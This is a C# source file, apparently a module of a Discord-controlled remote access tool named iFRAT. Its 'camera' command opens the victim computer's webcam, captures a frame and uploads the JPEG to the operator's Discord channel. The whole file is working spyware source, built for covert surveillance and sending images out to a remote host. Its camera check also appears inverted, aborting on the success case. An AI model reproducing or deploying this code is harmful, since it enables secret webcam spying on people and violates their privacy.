using Discord;
using Discord.Interactions;
using Discord.Rest;
using Discord.WebSocket;
using Emgu.CV;
using Emgu.CV.Structure;
using iFRAT.Extensions;
using Masked.DiscordNet.Extensions;
using Spectre.Console;

namespace iFRAT.Commands;

#pragma warning disable MA0004 // Disable -> Use ConfigurateAwait(false); as no SyncCtx is needed.
/// <summary>
/// The Camera Command. Allows to take an image of what the Webcam of the computer can see
/// </summary>
public sealed class Camera : Masked.DiscordNet.IDiscordCommand
{
    public static Camera GlobalInstance { get; } = new();

    public async Task Run(SocketSlashCommand sockCommand)
    {
        await sockCommand.DeferAsync();
        var response = await sockCommand.FollowupAsync("Accessing the Computer's Camera...");
        VideoCapture capture = new();

        if (capture.IsOpened)
        {
            await response.ModifyAsync(x => x.Content = "Failed to access camera: Another application had an already opened handle to the camera. Can not continue operation.");
            return;
        }
        await response.ModifyAsync(x => x.Content = $"Camera Information:\nCamera Backend: {capture.BackendName}\nResolution {capture.Width!}x{capture.Height!}\nCamera Type: {capture.CaptureSource.ToStringOp()}");

        Mat frameRaw = capture.QueryFrame();

        await response.ReplyAsync("Frame Obtained. Processing and Sending.");

        var frameAsImage = frameRaw.ToImage<Bgr, byte>();
        var frameData = frameAsImage.ToJpegData();
        var temporalPath = Path.GetTempFileName();
        await File.WriteAllBytesAsync(temporalPath, frameData);

        await sockCommand.Channel.SendFileAsync(temporalPath, "Webcam Image Attached.");

        // Dispose of EVERYTHING.
        frameAsImage.Dispose();
        frameRaw.Dispose();
        capture.Dispose();

        // Delete temporal file.
        File.Delete(temporalPath);
    }

    public SlashCommandProperties Build()
    {
        return new SlashCommandBuilder
        {
            Name = "camera",
            Description = "Obtains a picture from the webcam of the computer.",
        }.Build();
    }
}